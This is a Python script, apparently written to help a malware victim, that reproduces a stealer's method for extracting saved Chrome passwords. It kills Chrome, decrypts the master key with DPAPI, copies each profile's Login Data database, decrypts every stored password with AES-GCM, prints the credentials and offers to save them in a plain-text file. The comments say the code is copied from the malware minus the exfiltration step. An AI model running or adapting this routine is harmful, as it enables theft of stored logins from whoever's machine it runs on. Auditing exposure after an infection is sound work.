# -*- coding: utf-8 -*-
import os
import json
import base64
import sqlite3
import shutil
import subprocess
import sys
sys.stdout.reconfigure(encoding='utf-8')   # Pour afficher correctement les emojis
# Ce code utilise EXACTEMENT la même méthode que le malware
# MAIS sans envoyer les données - juste les afficher

# Installation des dépendances
try:
    import win32crypt
    from Crypto.Cipher import AES
except:
    import sys
    print("Installation des modules nécessaires...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome", "pywin32"])
    import win32crypt
    from Crypto.Cipher import AES

# Variables
LOCALAPPDATA = os.getenv('LOCALAPPDATA')
PASSWORDS = []

# Fonction de déchiffrement EXACTE du malware
def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])

# Fermer Chrome
print("Fermeture de Chrome...")
subprocess.run(["taskkill", "/F", "/IM", "chrome.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Configuration Chrome
browser = {"name": "Google Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data")}
profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]

# Récupération de la clé
local_state = os.path.join(browser["path"], "Local State")

if not os.path.exists(local_state):
    print("Chrome n'est pas installé !")
    input("Appuyez sur Entrée...")
    exit()

with open(local_state, "r", encoding="utf-8") as f:
    local_state = json.loads(f.read())

key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
decryption_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

print(f"✓ Clé de déchiffrement récupérée\n")

# Parcours des profils
for profile in profiles:
    profile_path = os.path.join(browser["path"], profile)
    if not os.path.exists(profile_path):
        continue
    
    try:
        # Copie exacte du code malware
        login_data_file = os.path.join(browser["path"], profile, "Login Data")
        temp_db = os.path.join(browser["path"], profile, f"chrome-pw-temp.db")
        
        if not os.path.exists(login_data_file):
            continue
            
        shutil.copy(login_data_file, temp_db)
        connection = sqlite3.connect(temp_db)
        cursor = connection.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        profile_has_passwords = False
        
        for row in cursor.fetchall():
            origin_url = row[0]
            username = row[1]
            password = decrypt_data(row[2], decryption_key)
            
            if username or password:
                if not profile_has_passwords:
                    print(f"\n{'='*60}")
                    print(f"PROFIL : {profile}")
                    print(f"{'='*60}")
                    profile_has_passwords = True
                
                PASSWORDS.append({
                    "browser": browser["name"], 
                    "profile": profile, 
                    "url": origin_url, 
                    "username": username, 
                    "password": password
                })
                
                print(f"\nSite : {origin_url}")
                print(f"User : {username}")
                print(f"Pass : {password}")
                print("-" * 40)
        
        cursor.close()
        connection.close()
        os.remove(temp_db)
        
    except Exception as e:
        print(f"Erreur profil {profile}: {e}")

# Résumé
print(f"\n{'='*60}")
print(f"TOTAL : {len(PASSWORDS)} mots de passe trouvés")
print(f"{'='*60}")

if len(PASSWORDS) > 0:
    print("\n🚨 CES MOTS DE PASSE ONT ÉTÉ VOLÉS PAR LE MALWARE !")
    print("\nActions urgentes :")
    print("1. Changez-les TOUS immédiatement")
    print("2. Commencez par : email, banque, réseaux sociaux")
    print("3. Activez la 2FA partout")
    
    # Option de sauvegarde
    save = input("\nVoulez-vous sauvegarder la liste ? (o/n) : ")
    if save.lower() == 'o':
        filename = "mots_de_passe_voles.txt"
        with open(filename, "w") as f:
            f.write("MOTS DE PASSE VOLÉS PAR LE MALWARE\n")
            f.write("="*50 + "\n\n")
            for pw in PASSWORDS:
                f.write(f"Profil : {pw['profile']}\n")
                f.write(f"Site : {pw['url']}\n") 
                f.write(f"User : {pw['username']}\n")
                f.write(f"Pass : {pw['password']}\n")
                f.write("-"*50 + "\n")
        print(f"\n✓ Sauvegardé dans : {filename}")
else:
    print("\nAucun mot de passe trouvé.")
    print("Soit Chrome n'a pas de mots de passe sauvegardés,")
    print("soit il y a un problème de permissions.")

input("\nAppuyez sur Entrée pour fermer...")
